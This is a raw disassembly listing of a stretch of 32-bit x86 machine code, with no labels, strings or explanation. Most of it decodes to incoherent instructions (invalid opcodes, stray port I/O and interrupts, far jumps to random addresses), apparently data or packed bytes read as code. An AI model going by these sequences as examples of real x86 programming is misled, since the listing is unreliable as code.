  40a855:	or     eax,0x3cedf28b
  40a85a:	push   cs
  40a85b:	inc    ebx
  40a85c:	mov    ecx,0x9bd7b6e9
  40a861:	test   bh,bl
  40a863:	popf   
  40a864:	push   0xd2c97eb7
  40a869:	jb     0x40a7f7
  40a86b:	call   0x93ba:0xed774a67
  40a872:	sub    BYTE PTR [esp+ebp*8-0x6d],ah
  40a876:	scas   eax,DWORD PTR es:[edi]
  40a877:	test   BYTE PTR [edx-0x5d0fdebc],cl
  40a87d:	inc    ebx
  40a87e:	lock jb 0x40a858
  40a881:	push   edx
  40a882:	pop    edx
  40a883:	mov    ds:0x7e254562,al
  40a888:	test   al,0xbc
  40a88a:	pusha  
  40a88b:	in     eax,0x2b
  40a88d:	mov    WORD PTR [ecx-0x1742f65e],es
  40a893:	mov    cs,edx
  40a895:	(bad)  
  40a896:	xchg   ebx,eax
  40a897:	mov    dh,0x5e
  40a899:	fmul   QWORD PTR [ecx+0x4]
  40a89c:	inc    edx
  40a89d:	int    0xaf
  40a89f:	push   0x67
  40a8a1:	mov    ebp,0xa19ef761
  40a8a6:	fdivp  st(7),st
  40a8a8:	adc    cl,al
  40a8aa:	add    eax,0xc68c31ca
  40a8af:	mov    ebx,0xf2878340
  40a8b4:	cmp    DWORD PTR [edi-0x41],esi
  40a8b7:	out    dx,al
  40a8b8:	cmp    esp,DWORD PTR [edi+esi*1]
  40a8bb:	mov    ch,BYTE PTR [edi+0x64]
  40a8be:	push   0x7e
  40a8c0:	(bad)  [edi]
  40a8c2:	std    
  40a8c3:	jmp    0xe6eb6ac1
  40a8c8:	jp     0x40a8d3
  40a8ca:	leave  
  40a8cb:	xchg   edi,eax
  40a8cc:	shr    dh,0x44
  40a8cf:	fild   WORD PTR [edi-0x63]
  40a8d2:	sub    al,0xb7
  40a8d4:	jmp    0x66e3b380
  40a8d9:	mov    bl,dh
  40a8db:	inc    edx
  40a8dc:	mov    ecx,0x541f9d2
  40a8e1:	push   0xffffff92
  40a8e3:	int3   
  40a8e4:	(bad)  
  40a8e5:	inc    ebp
  40a8e7:	adc    BYTE PTR [edx],bh
  40a8e9:	out    dx,al
  40a8ea:	fld    QWORD PTR [esi-0xc]
  40a8ed:	pop    ss
  40a8ee:	aas    
  40a8ef:	cmp    eax,0xcbb41639
  40a8f4:	ficomp WORD PTR [edi-0x49]
  40a8f7:	pop    edx
  40a8f8:	xchg   DWORD PTR [esi+0x5f],esp
  40a8fb:	pop    edx
  40a8fc:	or     cl,dh
  40a8fe:	stc    
  40a8ff:	sti    
  40a900:	sub    bh,bh
  40a902:	xlat   BYTE PTR ds:[ebx]
  40a903:	or     al,0xc6
  40a905:	cmp    eax,0x561c216a
  40a90a:	adc    BYTE PTR [edx-0x37],ah
  40a90d:	xor    eax,DWORD PTR [esi-0x2c]
  40a910:	je     0x40a947
  40a912:	or     esi,DWORD PTR [ebp-0x1335b7f0]
  40a918:	jns    0x40a8a7
  40a91a:	dec    ebx
  40a91b:	mov    ebp,0x9796aad7
  40a920:	in     eax,dx
  40a921:	sub    eax,0xb20e946c
  40a926:	cmp    al,0x81
  40a928:	call   0xef67:0x787eaece
  40a92f:	pusha  
  40a930:	jg     0x40a963
  40a932:	xor    al,0xe2
  40a934:	mov    eax,ds:0x82a80290
  40a93a:	xor    DWORD PTR ds:0x892688cc,eax
  40a940:	pop    esi
  40a941:	inc    ebx
  40a942:	lea    edx,[ecx+0x28e8f2e3]
  40a948:	repz or eax,0x96bd67f8
  40a94e:	or     bl,ah
  40a950:	fcomip st,st(6)
  40a952:	aas    
  40a953:	sbb    BYTE PTR [eax+0x32],0x89
  40a957:	or     eax,0x417c63a4
  40a95c:	gs pop es
  40a95e:	addr16 xor eax,0xefb02f9
  40a964:	xchg   edx,eax
  40a965:	adc    eax,0x45e67def
  40a96a:	repnz cwde 
  40a96c:	adc    dh,cl
  40a96e:	test   DWORD PTR [ebp+0x61],edi
  40a971:	cld    
  40a972:	sub    DWORD PTR [edi+0x16],edx
  40a975:	pop    ecx
  40a976:	jbe    0x40a915
  40a978:	adc    dh,dl
  40a97a:	lock inc eax
  40a97c:	push   eax
  40a97d:	xchg   edi,eax
  40a97e:	dec    ebp
  40a97f:	inc    ebp
  40a980:	inc    edi
  40a981:	mov    edi,ecx
  40a983:	stc    
  40a984:	xor    cl,ah
  40a986:	stos   BYTE PTR es:[edi],al
  40a987:	add    al,0xde
  40a989:	mov    esp,0xa0ba92d9
  40a98e:	push   eax
  40a98f:	repnz fstp TBYTE PTR [edi-0x5ad6ea25]
  40a996:	xor    al,0x87
  40a998:	xchg   esi,eax
  40a999:	xor    edi,ebp
  40a99b:	inc    ebp
  40a99c:	mov    ebx,0x8c78f194
  40a9a1:	cld    
  40a9a2:	mov    ds:0x61d42ef8,eax
  40a9a7:	ret    0xf8e
  40a9aa:	loope  0x40a9be
  40a9ac:	dec    esp
  40a9ad:	mov    BYTE PTR [edx],bl
  40a9af:	pop    esp
  40a9b0:	(bad)  
  40a9b1:	std    
  40a9b2:	mov    cl,0xf2
  40a9b4:	in     eax,0x9e
  40a9b6:	jecxz  0x40aa1e
  40a9b8:	sti    
  40a9b9:	cmp    al,0x78
  40a9bb:	loop   0x40a96a
  40a9bd:	into   
  40a9be:	loope  0x40aa14
  40a9c0:	mov    ss,edi
  40a9c2:	or     ch,cl
  40a9c4:	sbb    DWORD PTR [esi+0x16025a3a],eax
  40a9ca:	sub    BYTE PTR [ecx+0x7c],ah
  40a9cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9ce:	repnz xchg ebp,eax
  40a9d0:	sub    eax,0xfb1e7d74
  40a9d5:	mov    edx,0xc924432a
  40a9da:	jl     0x40a9c8
  40a9dc:	pushf  
  40a9dd:	inc    ebx
  40a9de:	inc    ebx
  40a9df:	aaa    
  40a9e0:	clc    
  40a9e1:	jae    0x40aa49
  40a9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e4:	mov    edx,0x37bab536
  40a9e9:	in     al,dx
  40a9ea:	xor    dh,BYTE PTR [eax]
  40a9ec:	add    ecx,DWORD PTR [esi]
  40a9ee:	pop    ebp
  40a9ef:	mov    esp,0x5ddc5b73
  40a9f4:	push   esp
  40a9f5:	jo     0x40aa10
  40a9f7:	mov    edi,0x2f1b68eb
  40a9fc:	mov    al,ds:0x7f535bc5
  40aa01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa02:	inc    ebx
  40aa03:	cmp    al,0x6a
  40aa05:	shl    BYTE PTR [edx],cl
  40aa07:	ror    eax,cl
  40aa09:	sub    BYTE PTR ds:0x87882ff,bh
  40aa0f:	or     DWORD PTR [edi+0xea2a685],edi
  40aa15:	jno    0x40aa6b
  40aa17:	leave  
  40aa18:	pop    ebx
  40aa19:	lea    ecx,[esi-0x11]
  40aa1c:	pop    ds
  40aa1d:	ret    
  40aa1e:	sbb    cl,BYTE PTR [edx+0x7]
  40aa21:	add    DWORD PTR [ebx+ebp*4],ebx
  40aa24:	out    dx,al
  40aa25:	add    al,0xdb
  40aa27:	imul   edi,DWORD PTR [ebp+edx*1-0x7bde141a],0xffffffc6
  40aa2f:	iret   
  40aa30:	out    dx,al
  40aa31:	dec    edi
  40aa32:	mov    ds:0x8845ebc4,al
  40aa37:	jle    0x40aaab
  40aa39:	fwait
  40aa3a:	mov    esi,ecx
  40aa3c:	or     ch,cl
  40aa3e:	lea    ebp,[edi]
  40aa40:	pushf  
  40aa41:	lods   eax,DWORD PTR ds:[esi]
  40aa42:	loop   0x40aa89
  40aa44:	or     ecx,DWORD PTR [ecx+esi*2+0x60]
  40aa48:	and    al,0xc1
  40aa4a:	and    bh,bl
  40aa4c:	fnstcw WORD PTR [eax]
  40aa4e:	adc    DWORD PTR [edx-0x61e28df5],eax
  40aa54:	popa   
  40aa55:	jne    0x40aabd
  40aa57:	lods   eax,DWORD PTR ds:[esi]
  40aa58:	dec    eax
  40aa59:	jge    0x40aa25
  40aa5b:	ret    
  40aa5c:	mov    ebp,0x77140418
  40aa61:	sub    ebp,ecx
  40aa63:	push   edi
  40aa64:	out    0x8a,eax
  40aa66:	lahf   
  40aa67:	int    0x8e
  40aa69:	pop    esi
  40aa6a:	iret   
  40aa6b:	sahf   
  40aa6c:	lods   al,BYTE PTR ds:[esi]
  40aa6d:	loopne 0x40a9f9
  40aa6f:	adc    cl,bh
  40aa71:	cmp    DWORD PTR ss:[edx-0x15bcbd28],esi
  40aa78:	xor    BYTE PTR [edi+0x77],ch
  40aa7b:	mov    ah,0x70
  40aa7d:	xchg   dh,ch
  40aa7f:	sbb    al,0x79
  40aa81:	dec    ebx
  40aa82:	cmp    bh,ah
  40aa84:	or     BYTE PTR [esi],0xa7
  40aa87:	inc    ebp
  40aa88:	pop    esp
  40aa89:	(bad)  
  40aa8a:	sbb    al,0x12
  40aa8c:	mov    dh,0x47
  40aa8e:	jne    0x40aac3
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x9f95ffbc
  40aacc:	loope  0x40ab22
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx-0xe]
  40aad6:	mov    fs,WORD PTR [edx-0x68488b98]
  40aadc:	and    eax,0x64d52af3
  40aae1:	lods   al,BYTE PTR ds:[esi]
  40aae2:	dec    edx
  40aae3:	or     DWORD PTR [ecx],0x7d5c0ee0
  40aae9:	and    al,0x87
  40aaeb:	adc    eax,ecx
  40aaed:	mov    eax,ds:0xb260b5e8
  40aaf2:	or     eax,0x4bd5c1db
  40aaf7:	je     0x40ab0f
  40aaf9:	xchg   ecx,eax
  40aafa:	jg     0x40aac0
  40aafc:	sub    esi,0x2d
  40aaff:	in     al,dx
  40ab00:	adc    DWORD PTR [ecx+0x17],eax
  40ab03:	lods   al,BYTE PTR ds:[esi]
  40ab04:	clc    
  40ab05:	test   al,0x83
  40ab07:	mov    esi,0x113ff716
  40ab0c:	outs   dx,DWORD PTR ds:[esi]
  40ab0d:	loope  0x40aabd
  40ab0f:	cmp    BYTE PTR [edx],dl
  40ab11:	inc    eax
  40ab12:	out    dx,al
  40ab13:	mov    al,BYTE PTR [edi+0x1479c0e5]
  40ab19:	mov    ds:0x8d0890e9,al
  40ab1e:	xlat   BYTE PTR ds:[ebx]
  40ab1f:	test   al,0x99
  40ab21:	das    
  40ab22:	sbb    ah,BYTE PTR [edi-0x1]
  40ab25:	ret    
  40ab26:	call   0x6a236307
  40ab2b:	stc    
  40ab2c:	xor    ebp,eax
  40ab2e:	cmp    edi,DWORD PTR [edi+0x2a]
  40ab31:	sbb    cl,bl
  40ab33:	popa   
  40ab34:	in     eax,dx
  40ab35:	mov    cl,0xb
  40ab37:	push   ebp
  40ab38:	jmp    0xae924eba
  40ab3d:	outs   dx,DWORD PTR ds:[esi]
  40ab3e:	add    DWORD PTR [ebx+edx*8-0xe],edi
  40ab42:	xchg   DWORD PTR [eax],esp
  40ab44:	inc    esp
  40ab45:	imul   esi,DWORD PTR [esi+0x34],0xfffffff2
  40ab49:	cmp    al,BYTE PTR [ecx+esi*2]
  40ab4c:	sub    eax,0xe3f3aa0e
  40ab51:	dec    ebp
  40ab52:	dec    esp
  40ab53:	mov    es,WORD PTR [eax+0x1522c016]
  40ab59:	les    ecx,FWORD PTR [ebx-0x8]
  40ab5c:	push   0xffffffb6
  40ab5e:	jo     0x40ab35
  40ab60:	adc    DWORD PTR ds:0xe61a4da1,ecx
  40ab66:	rol    DWORD PTR [ecx+eiz*2+0x59],cl
  40ab6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab6b:	sub    eax,0x9c2e0d96
  40ab70:	mov    bl,0xe5
  40ab72:	dec    edi
  40ab73:	push   edi
  40ab74:	jle    0x40abac
  40ab76:	(bad)  
  40ab77:	stos   BYTE PTR es:[edi],al
  40ab78:	mov    DWORD PTR [ebx],ecx
  40ab7a:	aas    
  40ab7b:	cmp    esp,DWORD PTR [edx+0x71695321]
  40ab81:	xchg   ecx,eax
  40ab82:	mov    ah,0x96
  40ab84:	fwait
  40ab85:	adc    cl,BYTE PTR [esi-0x60f98b86]
  40ab8b:	push   eax
  40ab8c:	ja     0x40abd8
  40ab8e:	cmp    eax,DWORD PTR [ebx+0x562d007a]
  40ab94:	sar    edi,1
  40ab96:	je     0x40abd9
  40ab98:	or     dl,0x4
  40ab9b:	add    eax,0x876a7ac3
  40aba0:	and    ebx,DWORD PTR [ecx+0x78]
  40aba3:	mov    esi,0xac47b62a
  40aba8:	push   0x7a
  40abaa:	cwde   
  40abab:	fdiv   st,st(0)
  40abad:	inc    ebp
  40abae:	jp     0x40abd6
  40abb0:	out    0xee,eax
  40abb2:	hlt    
  40abb3:	push   ebp
  40abb4:	mov    cl,0xe
  40abb6:	scas   eax,DWORD PTR es:[edi]
  40abb7:	mov    edx,0x24c4f851
  40abbc:	call   0xdc55588d
  40abc1:	or     edi,DWORD PTR [esi-0x9]
  40abc4:	push   edi
  40abc5:	push   0xb371f3e9
  40abca:	test   BYTE PTR [ecx-0x17],ch
  40abcd:	jge    0x40ac4e
  40abcf:	mov    ebp,0xd10513a
  40abd4:	fisttp WORD PTR [eax-0x55]
  40abd7:	sbb    al,0x13
  40abd9:	inc    eax
  40abda:	icebp  
  40abdb:	mov    esp,0xabd3f7ca
  40abe0:	in     al,0xe2
  40abe2:	loop   0x40abed
  40abe4:	xor    BYTE PTR [ebx-0x40],dl
  40abe7:	ficom  WORD PTR [ebx-0x305ed8d2]
  40abed:	iret   
  40abee:	add    ebx,DWORD PTR [ecx]
  40abf0:	scas   eax,DWORD PTR es:[edi]
  40abf1:	mov    edi,0xb246e514
  40abf6:	pop    edi
  40abf7:	fs iret 
  40abf9:	cmp    eax,0xbe953d53
  40abfe:	outs   dx,BYTE PTR ds:[esi]
  40abff:	mov    edi,DWORD PTR gs:[ecx]
  40ac02:	call   0x991d:0x4caf26a3
  40ac09:	or     DWORD PTR [esi+0x7ee048a0],0x41
  40ac10:	jp     0x40ac84
  40ac12:	dec    eax
  40ac13:	mov    esp,DWORD PTR [edx+esi*8+0x3e0afdb8]
  40ac1a:	push   ds
  40ac1b:	pop    edi
  40ac1c:	mov    ds:0x4a0f9676,al
  40ac21:	lods   al,BYTE PTR ds:[esi]
  40ac22:	aad    0x84
  40ac24:	xor    BYTE PTR [ebx+0x19],dh
  40ac27:	mov    edx,0x2f38b65d
  40ac2c:	push   0x259639cf
  40ac31:	test   eax,0x5e613d70
  40ac36:	dec    ebp
  40ac37:	push   edx
  40ac38:	cmp    al,0x66
  40ac3a:	jge    0x40ac20
  40ac3c:	sub    DWORD PTR [edx+ebx*2+0x77],ebp
  40ac40:	daa    
  40ac41:	hlt    
  40ac42:	in     al,0xad
  40ac44:	or     edi,esi
  40ac46:	pop    edx
  40ac47:	add    DWORD PTR [eax],ebx
  40ac49:	repnz push cs
  40ac4b:	dec    eax
  40ac4c:	ret    
  40ac4d:	das    
  40ac4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac4f:	stos   BYTE PTR es:[edi],al
  40ac50:	aaa    
  40ac51:	adc    al,0xbe
  40ac53:	dec    edi
  40ac54:	adc    DWORD PTR ds:0xe8ad6ce5,eax
  40ac5a:	aas    
  40ac5b:	stos   DWORD PTR es:[edi],eax
  40ac5c:	mov    ?,esi
  40ac5e:	or     eax,0xe1350a24
  40ac63:	push   esi
  40ac64:	dec    ebp
  40ac65:	popf   
  40ac66:	retf   
  40ac67:	outs   dx,DWORD PTR ds:[esi]
  40ac68:	xchg   BYTE PTR [edi-0x54],bh
  40ac6b:	sahf   
  40ac6c:	push   ebx
  40ac6d:	or     dl,BYTE PTR [ecx-0x66f3f621]
  40ac73:	pop    esi
  40ac74:	test   eax,0x115e26ef
  40ac79:	or     al,0x86
  40ac7b:	in     al,dx
  40ac7c:	add    ebx,DWORD PTR [ebp+0x68868ea8]
  40ac82:	xchg   DWORD PTR [ebx-0x22],edi
  40ac85:	dec    ecx
  40ac86:	or     bl,BYTE PTR [ebx-0x4b]
  40ac89:	push   esi
  40ac8a:	ss jb  0x40acdc
  40ac8d:	mov    eax,ds:0xa1746318
  40ac92:	jg     0x40ace3
  40ac94:	rcr    BYTE PTR [ebx+ebp*8-0x344a2d8d],cl
  40ac9b:	dec    edx
  40ac9c:	cmp    dl,BYTE PTR [eax+eiz*8-0x664c5272]
  40aca3:	aas    
  40aca4:	(bad)  
  40aca5:	sbb    esi,DWORD PTR [edi-0x483a0398]
  40acab:	push   cs
  40acac:	in     al,dx
  40acad:	adc    esp,esp
  40acaf:	jno    0x40ac39
  40acb1:	sub    bl,BYTE PTR [ebx]
  40acb3:	ss xor cl,0xb
  40acb7:	bound  eax,QWORD PTR [ebx+eiz*2-0xa]
  40acbb:	cmp    DWORD PTR [edx+0x18],ecx
  40acbe:	sub    ebx,DWORD PTR [edx-0x5bba1cc]
  40acc4:	call   0xee8a93bf
  40acc9:	and    eax,0xc0d339d7
  40acce:	cmp    DWORD PTR [eax],ebx
  40acd0:	sub    DWORD PTR [eax+eax*1-0x73d92851],esi
  40acd7:	retf   
  40acd8:	not    DWORD PTR [ebx]
  40acda:	inc    edi
  40acdb:	sti    
  40acdc:	cld    
  40acdd:	sbb    al,BYTE PTR [ebp-0x3d]
  40ace0:	ret    0xa5bc
  40ace3:	sub    DWORD PTR [ebx+0x14],edx
  40ace6:	jge    0x40ad55
  40ace8:	test   al,0xdf
  40acea:	push   esp
  40aceb:	fs push ebx
  40aced:	lock sub dl,0xd7
  40acf1:	fmul   st(1),st
  40acf3:	dec    esi
  40acf4:	mov    ecx,0xc6c91f2b
  40acf9:	and    al,0x95
  40acfb:	fmul   st(5),st
  40acfd:	xor    bh,bl
  40acff:	les    ebp,FWORD PTR [eax]
  40ad01:	scas   eax,DWORD PTR es:[edi]
  40ad02:	dec    esp
  40ad03:	in     al,dx
  40ad04:	xchg   ecx,eax
  40ad05:	sub    al,0xe3
  40ad07:	dec    eax
  40ad08:	jne    0x40ad2e
  40ad0a:	pop    ss
  40ad0b:	jmp    0x40ad32
  40ad0d:	mov    bl,0x2a
  40ad0f:	repnz test DWORD PTR [ebx+0x4a],0x1faa7dca
  40ad17:	fs jecxz 0x40ad75
  40ad1a:	or     BYTE PTR [ebx-0x39],ah
  40ad1d:	or     eax,0xacfb1b13
  40ad22:	add    eax,0xe7091205
  40ad27:	mov    dh,0xde
  40ad29:	gs inc ecx
  40ad2b:	hlt    
  40ad2c:	xor    ebx,0x33bc11fb
  40ad32:	int3   
  40ad33:	fidiv  DWORD PTR [ebx+0x104a3794]
  40ad39:	test   BYTE PTR [eax],bh
  40ad3b:	jne    0x40ad7e
  40ad3d:	aaa    
  40ad3e:	jl     0x40ad5e
  40ad40:	jne    0x40ad7e
  40ad42:	jmp    0xfee1d49e
  40ad47:	fnstenv [ebp-0x3e526c6a]
  40ad4d:	xchg   ebp,eax
  40ad4e:	cld    
  40ad4f:	lods   eax,DWORD PTR ds:[esi]
  40ad50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad51:	lea    esp,[edi+edi*8-0x38c81707]
  40ad58:	enter  0xd350,0xc7
  40ad5c:	imul   ecx,DWORD PTR [eax+0x1f1a4d71],0xaeb9b658
  40ad66:	xor    BYTE PTR [esi],cl
  40ad68:	rol    BYTE PTR [ebp-0x52632320],0x17
  40ad6f:	sub    al,0x80
  40ad71:	push   esp
  40ad72:	pop    ecx
  40ad73:	sub    dh,BYTE PTR [eax-0x41]
  40ad76:	or     esi,ecx
  40ad78:	int    0x8d
  40ad7a:	(bad)  
  40ad7c:	xor    DWORD PTR [esp+edi*8-0x4c],edi
  40ad80:	mov    esi,0x59aa69b5
  40ad85:	in     al,dx
  40ad86:	stc    
  40ad87:	mov    esi,0x764541a3
  40ad8c:	ss test eax,0x41bb1b81
  40ad92:	shl    BYTE PTR [eax+0x21],cl
  40ad95:	fs jmp 0x40adc3
  40ad98:	pop    ss
  40ad99:	ins    DWORD PTR es:[edi],dx
  40ad9a:	bound  ecx,QWORD PTR [ecx-0x12437989]
  40ada0:	or     esi,DWORD PTR [edi]
  40ada2:	mov    edi,0x2159f6e7
  40ada7:	jge    0x40ad77
  40ada9:	rol    bl,0x88
  40adac:	pop    ebp
  40adad:	cmp    ch,bl
  40adaf:	add    al,0xc2
  40adb1:	mov    ds:0xa709a462,eax
  40adb6:	sub    cl,al
  40adb8:	push   ds
  40adb9:	xchg   DWORD PTR [eax-0x61],eax
  40adbc:	mov    fs,WORD PTR [edi+edx*2-0x5a]
  40adc0:	retf   
  40adc1:	add    edx,DWORD PTR [ecx]
  40adc3:	mov    cl,0x72
  40adc5:	arpl   ax,bp
  40adc7:	sar    BYTE PTR [eax-0x495e8531],0xb4
  40adce:	daa    
  40adcf:	imul   esp,DWORD PTR [ecx],0x59
  40add2:	(bad)
  40add6:	bound  ebx,QWORD PTR [edi+0x24]
  40add9:	push   ss
  40adda:	pusha  
  40addb:	cmp    al,0x35
  40addd:	jmp    0x8378:0x4c347960
  40ade4:	dec    ebp
  40ade5:	call   0xc36ab105
  40adea:	div    al
  40adec:	xchg   ebx,eax
  40aded:	dec    esi
  40adee:	adc    esi,DWORD PTR [ebx]
  40adf0:	aas    
  40adf1:	loope  0x40ada3
  40adf3:	jle    0x40ae10
  40adf5:	pop    eax
  40adf6:	les    ebx,FWORD PTR cs:[ebp-0x6216b32c]
  40adfd:	mov    eax,ds:0xc2756cb
  40ae02:	inc    eax
  40ae03:	jle    0x40addf
  40ae05:	xchg   DWORD PTR [ecx],edi
  40ae07:	mov    ebx,0x3e5b5407
  40ae0c:	iret   
  40ae0d:	stos   BYTE PTR es:[edi],al
  40ae0e:	xchg   edx,eax
  40ae0f:	push   esp
  40ae10:	sub    eax,0x2565ff9f
  40ae15:	dec    esp
  40ae16:	push   ebx
  40ae17:	push   0x47fb6bc6
  40ae1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae1d:	call   FWORD PTR [ecx-0x50]
  40ae20:	jp     0x40ae31
  40ae22:	mov    al,0xa
  40ae24:	ret    
  40ae25:	add    dh,ch
  40ae27:	xchg   edx,eax
  40ae28:	addr16 sbb al,0xf6
  40ae2b:	syscall 
  40ae2d:	sub    BYTE PTR [esi-0x47],bl
  40ae30:	fs scas eax,DWORD PTR es:[edi]
  40ae32:	je     0x40ae8f
  40ae34:	sub    ebx,DWORD PTR [ecx-0x2e]
  40ae37:	jmp    0xa599be76
  40ae3c:	retf   
  40ae3d:	fisttp WORD PTR [ecx-0x1003a57f]
  40ae43:	in     al,dx
  40ae44:	mov    gs:0x942ec1f6,al
  40ae4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae4b:	cmp    edi,esi
  40ae4d:	les    edx,FWORD PTR [ecx+0x74]
  40ae50:	and    DWORD PTR [esi],eax
  40ae52:	mov    bl,0x1c
  40ae54:	pop    esi
  40ae55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae56:	hlt    
  40ae57:	jo     0x40ae12
  40ae59:	std    
  40ae5a:	cmc    
  40ae5b:	scas   al,BYTE PTR es:[edi]
  40ae5c:	mov    DWORD PTR [eax],0xce064e12
  40ae62:	clc    
  40ae63:	inc    edx
  40ae64:	ret    0x9375
  40ae67:	out    dx,eax
  40ae68:	xchg   ebx,eax
  40ae69:	stos   DWORD PTR es:[edi],eax
  40ae6a:	sub    BYTE PTR [esi+0x46da0eaf],0x82
  40ae71:	addr16 mov eax,0x14d0e574
  40ae77:	adc    eax,0x11a7c4c3
  40ae7c:	ret    0x6f50
  40ae7f:	in     ax,0x52
  40ae82:	test   DWORD PTR [ecx+ebx*8+0x33],0x4affcd47
  40ae8a:	mov    ah,0xd
  40ae8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae8d:	or     BYTE PTR [edx+0x4f04d20f],ah
  40ae93:	test   eax,0x87b26843
  40ae98:	jb     0x40aeb4
  40ae9a:	ins    BYTE PTR es:[edi],dx
  40ae9b:	out    0x0,eax
  40ae9d:	push   es
  40ae9e:	jbe    0x40af11
  40aea0:	loope  0x40af0f
  40aea2:	popa   
  40aea3:	add    al,0x5e
  40aea5:	mov    al,0x95
  40aea7:	aad    0x25
  40aea9:	xchg   edx,eax
  40aeaa:	inc    edx
  40aeab:	xchg   ecx,eax
  40aeac:	test   dl,0xc8
  40aeaf:	imul   edi,DWORD PTR [ecx-0x1f],0x9c5fa326
  40aeb6:	inc    esp
  40aeb7:	and    eax,0xeff04d80
  40aebc:	loope  0x40af26
  40aebe:	sahf   
  40aebf:	ret    0x8973
  40aec2:	jp     0x40af24
  40aec4:	jmp    0xd6199237
  40aec9:	outs   dx,BYTE PTR ds:[esi]
  40aeca:	sbb    bl,dh
  40aecc:	popa   
  40aecd:	iret   
  40aece:	daa    
  40aecf:	jnp    0x40aedc
  40aed1:	and    al,0x10
  40aed3:	cmp    dh,ah
  40aed5:	int3   
  40aed6:	mov    ds:0x1110fd79,eax
  40aedb:	add    esi,edi
  40aedd:	jne    0x40af1f
  40aedf:	mov    fs,WORD PTR ds:0x4bf8519c
  40aee5:	xchg   edi,eax
  40aee6:	aas    
  40aee7:	pminub mm2,mm6
  40aeea:	retf   0xac6c
  40aeed:	je     0x40af28
  40aeef:	jmp    0xc3078ee8
  40aef4:	test   al,0xb8
  40aef6:	xchg   edi,eax
  40aef7:	or     DWORD PTR [ecx+0x4b61802a],ebp
  40aefd:	(bad)  
  40aefe:	xlat   BYTE PTR ds:[ebx]
  40aeff:	mov    ecx,0x43286bff
  40af04:	push   ebp
  40af05:	mov    bh,0x94
  40af07:	cmp    dl,BYTE PTR [ebp-0x2651f26e]
  40af0d:	(bad)  
  40af0e:	add    al,0xee
  40af10:	int3   
  40af11:	out    dx,al
  40af12:	in     al,dx
  40af13:	mov    esi,0xb3604749
  40af18:	mov    eax,ds:0x73d90e6
  40af1d:	mov    al,ds:0xfabef280
  40af22:	lds    esp,FWORD PTR [esi-0x1]
  40af25:	aam    0x46
  40af27:	sbb    eax,0x32637b9d
  40af2c:	mov    ah,0xa1
  40af2e:	add    BYTE PTR [eax-0x1e],0x3f
  40af32:	arpl   WORD PTR [eax+0x3349d83d],si
  40af38:	mov    al,ds:0x62fc4f8a
  40af3d:	in     eax,0x74
  40af3f:	dec    eax
  40af40:	mov    ah,0x8e
  40af42:	pop    esi
  40af43:	out    dx,eax
  40af44:	fst    DWORD PTR [ecx]
  40af46:	out    dx,eax
  40af47:	aam    0xad
  40af49:	aam    0x98
  40af4b:	repnz or dh,BYTE PTR [esi]
  40af4e:	fisttp WORD PTR [edi-0x62a736a4]
  40af54:	jg     0x40af31
  40af56:	fstp   DWORD PTR [edx+0x71]
  40af59:	xchg   esp,eax
  40af5a:	(bad)  
  40af5b:	(bad)  
  40af5c:	xchg   esi,eax
  40af5d:	cmp    al,0x7f
  40af5f:	jb     0x40af75
  40af61:	(bad)  
  40af62:	adc    BYTE PTR [ebx+0x2d89c728],bl
  40af68:	sub    eax,0x90ee735b
  40af6d:	iret   
  40af6e:	les    edx,FWORD PTR [ebp-0x33532c85]
  40af74:	push   es
  40af75:	popf   
  40af76:	sbb    DWORD PTR [esi-0x14],0x2d82ff63
  40af7d:	dec    ecx
  40af7e:	dec    edi
  40af7f:	sti    
  40af80:	jo     0x40afca
  40af82:	push   es
  40af83:	pusha  
  40af84:	add    DWORD PTR [esi-0x59d758a1],0xf5678c04
  40af8e:	fs test eax,ebx
  40af91:	lahf   
  40af92:	dec    ecx
  40af93:	lods   al,BYTE PTR ds:[esi]
  40af94:	inc    eax
  40af95:	js     0x40af79
  40af97:	dec    ecx
  40af98:	mul    BYTE PTR [eax+0x29]
  40af9b:	je     0x40affd
  40af9d:	(bad)  [ebp-0x4613611c]
  40afa3:	(bad)
  40afa6:	adc    DWORD PTR [esi+0x20],ebx
  40afa9:	lea    esp,[edi+ecx*2+0x373096ee]
  40afb0:	xor    esi,esi
  40afb2:	inc    ebx
  40afb3:	mov    cl,0xe3
  40afb5:	adc    al,0xe5
  40afb7:	mov    WORD PTR [eax],gs
  40afb9:	aad    0x1b
  40afbb:	sub    al,bl
  40afbd:	add    al,dl
  40afbf:	mov    al,0xb3
  40afc1:	enter  0x55ea,0x92
  40afc5:	repz add ch,bh
  40afc8:	cmp    eax,0x5114e4ba
  40afcd:	jg     0x40afe3
  40afcf:	cmp    DWORD PTR [edi+ebp*4+0x7f],ecx
  40afd3:	cmc    
  40afd4:	push   ecx
  40afd5:	mov    ebx,DWORD PTR [edx]
  40afd7:	lods   al,BYTE PTR ds:[esi]
  40afd8:	scas   eax,DWORD PTR es:[edi]
  40afd9:	(bad)  
  40afda:	adc    al,0xb2
  40afdc:	pop    ss
  40afdd:	pop    esi
  40afde:	das    
